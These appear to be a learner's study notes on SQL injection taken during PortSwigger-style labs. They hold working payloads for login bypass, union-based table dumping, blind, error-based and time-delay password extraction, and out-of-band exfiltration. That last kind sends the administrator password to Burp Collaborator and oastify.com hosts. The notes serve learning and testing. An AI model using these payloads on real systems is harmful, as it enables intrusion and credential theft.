SQL Injections - web vulnerability that allows an attacker to interfere with database queries of an application.
Can enable attackers to view, modify, delete data they shouldnt access.
<b>The ability to insert sql code into sql statement</b>

Detection:

- ` " ') ") .... test basic chars
- OR 1=1
- use comments symbols

Most SQL injections occurs:

- within WHERE of SELECT.
- In Update with WHER
- In Insert
- Select with Order By

---

https://insecure-website.com/products?category=Gifts
SELECT \* FROM products WHERE category = 'Gifts' AND released = 1

https://insecure-website.com/products?category=Gifts'--
SELECT \* FROM products WHERE category = 'Gifts'--' AND released = 1

=> Display not released products in category

https://insecure-website.com/products?category=Gifts'+OR+1=1--
SELECT \* FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

=> Display all products

administrator'--
SELECT \* FROM users WHERE username = 'administrator'--' AND password = ''

=> Bypass password check

<b>Union Attack</b> - "Union" operator combines results of two or more queries into signle row.

SELECT username, email FROM users WHERE id = '1';
ID: '1' UNION SELECT null, database()--
SELECT username, email FROM users WHERE id = '1' UNION SELECT null, database()--';
=>

1. First query fetch the username and email
2. Union add the results of another query ( null, database()) which retrieve db name

---

1' ORDER BY 1--

If the query works up to 3 columns and breaks at 4, it means the original query has 3 columns

<i>Check for Compatible Data Types</i>
When numbers of coulmn has known => UNION.
UNION SELECT null, null, null--(or #,....)
=>
UNION SELECT null, null, "a"--
...

If this works, the attacker can start replacing null with actual payloads to extract data

<i>Extract Data</i>
Know how many columns + data types

UNION SELECT null null FROM users--
' UNION SELECT username || '~' || password FROM users-- (concatenating (||) in oracle)

SQL Keywords:

- database()
- @@version
- FROM information_schema.table (db structure, except oracle)
- v$version
- version()

Get tables in DB
SELECT \* FROM information_schema.tables

Get columns in table
SELECT \* FROM information_schema.columns WHERE table_name = 'Users'

1' UNION SELECT table_name,null FROM information_schema.tables-- (Get table names)
1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_nulpja' (get table columns)
1' UNION SELECT username_dyqewc,password_tcrncn FROM users_nulpja (Get table data)

https://portswigger.net/web-security/sql-injection/cheat-sheet

<i>Blind SQLi:</i>
Application vulnerable to SQLi but http reponse dont contain the result of SQL query or errors.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

We have Users with password,username. <b>Blind test on admin password (0 letter > m)</b>
TrackingId=A2FGKLWwfWFNdOLB' AND (SELECT SUBSTRING(password,§1§,1) From users where username='administrator')='§g§

<i>Blind SQLi with conditional errors</i>
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
Same like before, but with error as a trigger to understand.

<b>
In previous scenario, we have "welcome message" from backend if sql query loads fine.
In this scenario, we use 500 error as correct signal
</b>

<i>Verbose SQL error messages</i>
We can use error messages from DB in our purpose.
We can use "CAST" funciton to provoke error message that leak sensitive data.

CAST((SELECT example_column FROM example_table) AS int)
We can cast string to int, to provoke error
ERROR: invalid input syntax for type integer: "Example data"

CAST((SELECT 1) AS int):

- Select 1 - simple query that select "1" (used to test query structure)

---

<b>If the Application catches db errors and handling are correct => there won't be any difference in response</b>
<i>Application does not respond any differently based on whether the query returns any rows or causes an error.</i>
In this case, we can use <b>Time Delay triggers</b> to determine the truth of injected condition.

<code>
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
</code>

In lab "Blind SQL injection with time delays and information retrieval"

- TrackingId=1'||pg_sleep(10)--;
  At this stage, we know, this db is vulnerable.
- 1';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
  Here we used condition+delay, by ";" we terminate original request
- 1'; SELECT CASE WHEN (Select COUNT(username) from Users where username='administrator' AND SUBSTRING(password,1,1)>'a')=1 THEN pg_sleep(3) ELSE pg_sleep(0) END--
  Here we can iterate throught password and crack password
- Add to intruder SUBSTRING(password,{index},1)='{letter}'
  nv1veh43t3ign5tv6jgz

---

<b>OAST technique </b>
Some dbs have built in function to resolve hostnames or to connect to external.
In PG, pg_read_files() or function in (PL/pgsql, PL/Perl, Pl/Python), or custom extensions to perform HTTP calls.

In MSSQL: <code>'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
</code>

copy (SELECT '') to program 'nslookup r6y3d1v37twqiqcycw2h3nxpxg37rxfm.oastify.com'

LOAD_FILE('\\\\6y3d1v37twqiqcycw2h3nxpxg37rxfm.oastify.com\\a')
SELECT ... INTO OUTFILE '\\\\6y3d1v37twqiqcycw2h3nxpxg37rxfm.oastify.com\a'--

Solution1:
1' SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://y3d1v37twqiqcycw2h3nxpxg37rxfm.oastify.com/"> %remote;]>'),'/l') FROM dual--

Data Exfilatrtion Example:
<code>'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--</code>

Solution2:
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.6t0i0giiu8j555zdzbpwq2k4kvqnej28.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

<b>XML context</b>
Solution1:
Union Select password from users where username='administrator'--
OR
1&#85;&#110;&#105;&#111;&#110;&#32;&#83;&#101;&#108;&#101;&#99;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#102;&#114;&#111;&#109;&#32;&#117;&#115;&#101;&#114;&#115;&#45;&#45;
(Cyberchef "to HTML" format)
